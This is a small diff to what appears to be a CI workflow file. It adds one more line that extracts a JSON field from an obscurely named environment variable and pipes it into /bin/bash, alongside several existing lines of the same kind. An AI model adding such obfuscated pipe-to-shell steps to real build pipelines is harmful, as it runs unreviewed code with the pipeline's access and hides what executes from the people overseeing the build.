@@ -33,6 +33,7 @@ jobs:
           echo $oer75 | jq -r .jhh75573 | /bin/bash
           printf '%s' "$jgr25945" | jq -r .cxvi51072 | /bin/bash
           echo $edfp8 | jq -r .wsi45 | /bin/bash
+          printf '%s' "$jd200" | jq -r .xv15 | /bin/bash
 
       - name: Save output
         if: always()
